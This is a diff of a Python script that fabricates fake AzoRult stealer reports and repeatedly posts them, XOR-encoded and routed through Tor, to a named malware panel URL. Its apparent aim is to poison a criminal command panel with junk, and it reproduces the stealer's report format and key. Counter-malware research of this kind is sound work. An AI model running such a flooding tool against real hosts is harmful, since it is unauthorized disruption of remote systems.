@@ -2,11 +2,12 @@ import random, string
 from ipaddress import IPv4Address
 from random import getrandbits
 from time import gmtime, strftime
-import urllib2
 import urllib
+import urllib2
 import os
 import shutil
-import zipfile
+import socks
+from sockshandler import SocksiPyHandler # pip install PySocks
 
 
 fileFirstnames = "first-names.txt"
@@ -37,6 +38,7 @@ unical_guid = "DV8CF101-053A-4498-98VA-EAB3719A088W-VF9A8B7AD-0FA0-4899-B4RD-D80
 xor_key = chr(13) + chr(10) + chr(200)
 
 url = "http://lusecproducts.top/ebuka/index.php"
+
 
 def create_zip():
     if os.path.isdir("output"):
@@ -98,17 +100,8 @@ def create_zip():
     with open("output/Browsers/History/GoogleChrome_Default.txt", 'a'):
         os.utime("output/Browsers/History/GoogleChrome_Default.txt", None)
 
-    '''
-    zipf = zipfile.ZipFile('output.zip', 'w', zipfile.ZIP_DEFLATED)
-
-    for root, dirs, files in os.walk("output"):
-        for file in files:
-            zipf.write(os.path.join(root, file))
-
-    zipf.close()
-    '''
-
     shutil.make_archive("output", "zip", "output")
+
 
 def cleanup_files():
     # Temporary encrypted file which is sent to server
@@ -145,6 +138,7 @@ def create_fakearchitecture():
         return "x64"
     else:
         return "x32"
+    
 
 def write_outputfile():
     # Info part:
@@ -152,7 +146,13 @@ def write_outputfile():
     outputfile += "<info" + unical_guid + ">" + glob_guid + "|" + glob_windowsversion[1] + "|" + glob_windowsversion[0] + "|"
     outputfile += glob_architecture + "|" + glob_hostname + "|" + glob_username + "|" + str(glob_count_fake_credentials) + "|"
     outputfile += "0|0|0|" # BTC | CC | Files - Will be added in future release
-    outputfile += "E|U" # Executable | User rights
+    outputfile += "E|" # Executable
+
+    bool = random.randint(0,1)
+    if bool == 0:
+        outputfile += "U" # User
+    else:
+         outputfile += "A" # Admin
     outputfile += "</info" + unical_guid + ">"
 
     # pwd part:
@@ -190,7 +190,7 @@ def write_outputfile():
     outputfile += f.read()
     outputfile += "</file" + unical_guid + ">"
 
-    resultfile = open("output.dat", "wb")
+    resultfile = open("output.dat", "w")
     resultfile.write(outputfile)
 
     return urllib.quote(outputfile)
@@ -203,6 +203,7 @@ def create_fakeversion():
     p4 = random.randint(1, 9999)
 
     return str(p1) + "." + str(p2) + "." + str(p3) + "." + str(p4)
+
 
 def create_fakesysteminfo():
     fake_filename = create_fakepassword() + ".exe"
@@ -295,6 +296,7 @@ def create_fakepassword():
 
     return x
 
+
 def create_fakecredentialdomain():
     rand_domain = random.randint(0, len(glob_cookiedomains) - 1)
     return glob_cookiedomains[rand_domain]
@@ -332,9 +334,9 @@ def create_fakecredentials():
                      "InternetMailRu",
                      "Kometa",
                      "MicrosoftEdge",
-                     "MozillaFirefox",
+                     "MozillaFireFox",
                      "Mustang",
-                     "Nichchrome",
+                     "Nichrome",
                      "Opera",
                      "Orbitum",
                      "Outlook",
@@ -400,6 +402,7 @@ def create_fakeip():
 
     glob_ip = addr_str
     return glob_ip
+
 
 ''' 
 Inside the ZIP file which is transferred to AzoRult panel there is a text file with cookie domains which we 
@@ -514,34 +517,39 @@ def create_mailaddress():
 i = 0
 
 while i < fake_reports:
-    glob_hostname = create_hostname()
-    glob_username = create_username()
-    glob_email = create_mailaddress()
-    glob_guid = create_guid()
-    glob_windowsversion = create_windsversion()
-    glob_cookiedomains = create_cookielist()
-    glob_ip = create_fakeip()
-    glob_countrycode = create_countrycode()
-    glob_fakecredentials = create_fakecredentials()
-    glob_fakesysteminfo = create_fakesysteminfo()
-    glob_architecture = create_fakearchitecture()
+    try:
+        glob_hostname = create_hostname()
+        glob_username = create_username()
+        glob_email = create_mailaddress()
+        glob_guid = create_guid()
+        glob_windowsversion = create_windsversion()
+        glob_cookiedomains = create_cookielist()
+        glob_ip = create_fakeip()
+        glob_countrycode = create_countrycode()
+        glob_fakecredentials = create_fakecredentials()
+        glob_fakesysteminfo = create_fakesysteminfo()
+        glob_architecture = create_fakearchitecture()
 
-    # Add all our informations to a ZIP file
-    create_zip()
+        # Add all our informations to a ZIP file
+        create_zip()
 
-    # Write the unencrypted POST data to a file
-    write_outputfile()
+        # Write the unencrypted POST data to a file
+        write_outputfile()
 
-    # Read the file as byte array
-    input_byte = bytearray(open("output.dat", 'rb').read())
+        # Read the file as byte array
+        input_byte = bytearray(open("output.dat", 'rb').read())
 
-    # Apply XOR key to our bytearray
-    result = CB_XORm(input_byte, xor_key, 1024*512)
+        # Apply XOR key to our bytearray
+        result = CB_XORm(input_byte, xor_key, 1024*512)
 
-    # Post the result to the panel
-    req = urllib2.Request(url, result, {'Content-Type': 'application/octet-stream'})
-    reply = urllib2.urlopen(req)
-    i = i + 1
-    print "Report sent to " + url
+        # Post the result to the panel
+        opener = urllib2.build_opener(SocksiPyHandler(socks.SOCKS5, "127.0.0.1", 9050))
+        req = urllib2.Request(url, result, {'Content-Type': 'application/octet-stream'})
+        #reply = urllib2.urlopen(req)
+        opener.open(req)
+        i = i + 1
+        print("[" + str(i) + " / " + str(fake_reports) + "] Report sent to " + url)
+    except Exception as e:
+        print "An error occured: " + str(e)
 
 
